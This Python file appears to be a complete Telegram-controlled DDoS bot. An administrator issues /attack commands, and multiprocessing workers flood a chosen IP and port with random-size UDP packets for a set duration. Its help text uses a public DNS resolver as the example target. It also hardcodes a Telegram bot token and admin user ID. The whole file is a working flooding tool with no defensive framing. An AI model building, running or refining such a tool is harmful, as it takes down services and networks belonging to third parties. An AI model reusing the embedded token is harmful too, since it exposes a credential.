import logging
import socket
import time
import random
import multiprocessing as mp
from datetime import datetime
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

# ==================== BOT CONFIG ====================
BOT_TOKEN = "7149714912:AAFDri0PhxEQoHtv3nW-YEq115PVeMVrLrI"
ADMIN_ID = 5879540185

active_attacks = {}
stop_flags = {}

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🔥 **VPS-Optimized UDP Attack Bot** Ready on 16 cores.")

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "⚔️ **VPS Attack Commands**\n\n"
        "`/attack <ip> <port> <duration> <processes>`\n"
        "Example: `/attack 8.8.8.8 53 60 32`\n"
        "(Use 16–64 processes on your 16-core VPS)\n\n"
        "/stopattack\n/status",
        parse_mode='Markdown'
    )

def attack_worker(ip, port, duration, stop_event, worker_id):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 * 1024 * 1024)  # 4MB buffer
        sock.setblocking(False)

        end_time = time.time() + duration
        packets = 0
        payload_base = b"POWERED_BY_VPS_ATTACK_" + str(worker_id).encode()

        while time.time() < end_time and not stop_event.is_set():
            try:
                size = random.randint(600, 1400)
                payload = payload_base + random.randbytes(size - len(payload_base))
                sock.sendto(payload[:size], (ip, port))
                packets += 1

                # Tiny backoff to avoid immediate buffer full
                if packets % 1000 == 0:
                    time.sleep(0.0001)
            except BlockingIOError:
                time.sleep(0.0005)
            except Exception:
                break

        sock.close()
        return packets
    except Exception as e:
        logger.error(f"Worker {worker_id} error: {e}")
        return 0

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("⛔ Unauthorized.")
        return

    if len(context.args) < 4:
        await update.message.reply_text("Usage: `/attack <ip> <port> <duration_sec> <processes>`", parse_mode='Markdown')
        return

    ip = context.args[0]
    port = int(context.args[1])
    duration = int(context.args[2])
    processes = min(int(context.args[3]), 128)  # Safety

    attack_id = f"{ip}:{port}_{int(time.time())}"
    stop_event = mp.Event()
    stop_flags[attack_id] = stop_event

    await update.message.reply_text(
        f"⚔️ **VPS ATTACK STARTED**\n"
        f"🎯 Target: `{ip}:{port}`\n"
        f"⏱ Duration: `{duration}s`\n"
        f"⚙ Processes: `{processes}` (on 16-core CPU)",
        parse_mode='Markdown'
    )

    pool = mp.Pool(processes=processes)
    results = []

    for i in range(processes):
        res = pool.apply_async(attack_worker, (ip, port, duration, stop_event, i))
        results.append(res)

    # Wait for finish
    total_sent = 0
    for res in results:
        total_sent += res.get()

    pool.close()
    pool.join()

    await update.message.reply_text(
        f"✅ **Attack Completed on VPS**\n"
        f"Target: `{ip}:{port}`\n"
        f"Processes: `{processes}`\n"
        f"Approx. packets sent: `{total_sent:,}`"
    )

async def stop_attack_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("⛔ Unauthorized.")
        return
    for ev in stop_flags.values():
        ev.set()
    await update.message.reply_text("🛑 All attacks stopped.")

def main():
    application = Application.builder().token(BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("stopattack", stop_attack_cmd))

    print("🔥 VPS-Optimized UDP Attack Bot Running on 16 cores!")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
